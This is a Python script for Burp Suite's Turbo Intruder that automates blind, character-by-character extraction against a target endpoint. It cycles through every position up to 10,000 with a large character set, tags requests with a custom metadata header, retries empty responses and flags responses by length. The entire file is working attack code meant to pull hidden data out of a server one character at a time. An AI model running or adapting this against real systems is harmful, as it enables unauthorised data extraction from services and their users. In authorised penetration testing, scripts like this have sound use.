import time

def queueRequests(target, wordlists):
    global engine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    alphabet = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+-=<>?,./;[]{}\|`~")
    max_pos = 10000

    for pos in range(1, max_pos + 1):
        for ch in alphabet:
            # Attach payload metadata so we can requeue the same payload later.
            meta_header = "X-TI-META: pos=%s;ch=%s" % (pos, ch)
            # insert header just before the blank line that separates headers and body
            req = target.req.replace(b"\r\n\r\n", ("\r\n" + meta_header + "\r\n\r\n").encode())
            # queue request; engine will replace %s placeholders with [pos, ch] in order
            engine.queue(req, [str(pos), ch])
            # small spacing to avoid bursts
            time.sleep(0.01)


def handleResponse(req, interesting):
    # If the response length == 4, treat as "null" and requeue the same payload
    if req.length == 4:
        try:
            raw_req = req.request  # bytes
            # find our meta header line
            hdr_start = raw_req.find(b"X-TI-META:")
            if hdr_start != -1:
                hdr_line_end = raw_req.find(b"\r\n", hdr_start)
                hdr_line = raw_req[hdr_start:hdr_line_end].decode()  # e.g. "X-TI-META: pos=5;ch=a"
                # parse pos and ch
                kvs = hdr_line.split(":", 1)[1].strip().split(";")
                kv = dict(p.split("=", 1) for p in kvs)
                pos = kv.get("pos")
                ch = kv.get("ch")
                if pos is not None and ch is not None:
                    # requeue the exact same payload (Turbo Intruder will substitute %s)
                    engine.queue(raw_req, [str(pos), ch])
                    # small delay before next retry to avoid hammering
                    return
        except Exception as e:
            # If anything goes wrong parsing/requeuing, log it and continue
            table.add(req)
            return

    # If not null (length != 4), use your existing filter to record interesting responses
    if req.length != 191:
        table.add(req)
